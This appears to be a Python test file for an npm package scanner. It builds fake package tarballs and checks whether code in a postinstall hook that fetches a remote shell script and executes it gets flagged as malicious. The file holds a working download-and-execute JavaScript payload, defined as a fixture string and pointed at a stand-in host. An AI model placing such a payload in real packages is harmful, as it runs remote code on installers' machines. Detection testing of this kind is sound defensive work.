import io
import json
import tarfile

from slopwatch.assessor.npm_source import analyze_npm_package_tarball


def _tgz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, content in files.items():
            data = content.encode()
            ti = tarfile.TarInfo(f"package/{name}")
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


DOWNLOAD_AND_RUN = (
    "const https = require('https');\nconst cp = require('child_process');\n"
    "https.get('https://cdn.example.net/p.sh', r => { let d=''; r.on('data', c => d += c);"
    " r.on('end', () => cp.exec(d)); });\n"
)


def test_lifecycle_script_running_download_and_exec_is_flagged():
    pkg = _tgz({
        "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "node scripts/install.js"}}),
        "scripts/install.js": DOWNLOAD_AND_RUN,
    })
    r = analyze_npm_package_tarball(pkg, "x")
    assert any(f.startswith("INSTALL_TIME_NETWORK_SOCKET") for f in r.flags)
    assert r.verdict.value == "MALICIOUS"


def test_same_code_not_wired_to_a_lifecycle_hook_is_not_install_time():
    pkg = _tgz({
        "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "node scripts/build.js"}}),
        "scripts/build.js": "console.log('build');\n",
        "lib/client.js": DOWNLOAD_AND_RUN,
    })
    r = analyze_npm_package_tarball(pkg, "x")
    assert not any(f.startswith("INSTALL_TIME_NETWORK_SOCKET") for f in r.flags)
